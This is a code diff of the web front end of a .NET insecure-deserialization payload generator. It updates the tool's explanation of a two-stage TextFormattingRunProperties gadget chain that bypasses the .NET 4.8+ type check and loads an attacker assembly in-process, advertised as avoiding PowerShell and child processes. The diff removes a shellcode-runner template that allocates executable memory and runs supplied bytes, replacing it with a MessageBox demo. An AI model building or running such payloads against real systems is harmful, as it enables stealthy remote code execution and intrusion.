@@ -4,7 +4,7 @@
 <div class="tool-panel">
     <div class="tool-header">
         <h3 class="tool-title">Insecure Deserialization</h3>
-        <p class="tool-subtitle">Two-stage TextFormattingRunProperties deserialization — Assembly.Load + CreateInstance during Deserialize.</p>
+        <p class="tool-subtitle">Two-stage TextFormattingRunProperties deserialization — in-process Assembly.Load + CreateInstance, no PowerShell.</p>
     </div>
 
     <div class="loader-content">
@@ -126,9 +126,10 @@
                 1. Script sets CLR version via <code>COMPLUS_Version</code><br/>
                 2. <b>Stage 1</b>: <code>BinaryFormatter.Deserialize</code> processes <code>TextFormattingRunProperties</code>
                    → XAML disables the .NET 4.8+ type check (throws after)<br/>
-                3. <b>Stage 2</b>: In the catch block, another <code>TextFormattingRunProperties</code> with XAML:
-                   <code>Convert.FromBase64String</code> → <code>Assembly.Load</code> → <code>CreateInstance</code><br/>
-                4. Your class constructor runs — zero method calls from JScript/VBScript
+                3. <b>Stage 2</b>: In the catch block, another <code>TextFormattingRunProperties</code> with XAML
+                   containing raw assembly bytes via <code>x:Array</code> →
+                   <code>Assembly.Load(byte[])</code> → <code>CreateInstance</code><br/>
+                4. Constructor runs in-process — no PowerShell, no child process, pure deserialization
             </p>
         </div>
 
@@ -176,22 +177,12 @@ using System.Runtime.InteropServices;
 
 public class TestClass
 {
-    delegate void Runner();
-
-    [DllImport(""kernel32"")]
-    static extern IntPtr VirtualAlloc(IntPtr a, uint sz, uint type, uint prot);
+    [DllImport(""user32.dll"", CharSet = CharSet.Unicode)]
+    static extern int MessageBox(IntPtr h, string text, string caption, uint type);
 
     public TestClass()
     {
-        // Replace with your shellcode
-        byte[] buf = new byte[] { 0xcc };
-
-        // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
-        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
-        Marshal.Copy(buf, 0, addr, buf.Length);
-
-        Runner run = (Runner)Marshal.GetDelegateForFunctionPointer(addr, typeof(Runner));
-        run();
+        MessageBox(IntPtr.Zero, ""Hello from deserialization!"", ""Stage 2"", 0);
     }
 }";
 
@@ -226,8 +217,7 @@ public class TestClass
             _dllFileName = $"{_sourceAssemblyName}.dll";
             _compileSuccess = true;
 
-            var dllB64 = Convert.ToBase64String(_dllBytes!);
-            _output = InsecureDeserializationGenerator.Generate(dllB64, _typeName, _format, RuntimeVersion);
+            _output = InsecureDeserializationGenerator.Generate(_dllBytes!, _typeName, _format, RuntimeVersion);
         }
         else
         {
@@ -264,8 +254,7 @@ public class TestClass
             return;
         }
 
-        var dllB64 = Convert.ToBase64String(_dllBytes);
-        _output = InsecureDeserializationGenerator.Generate(dllB64, _typeName, _format, RuntimeVersion);
+        _output = InsecureDeserializationGenerator.Generate(_dllBytes, _typeName, _format, RuntimeVersion);
     }
 
     private void RebuildFromBlob()
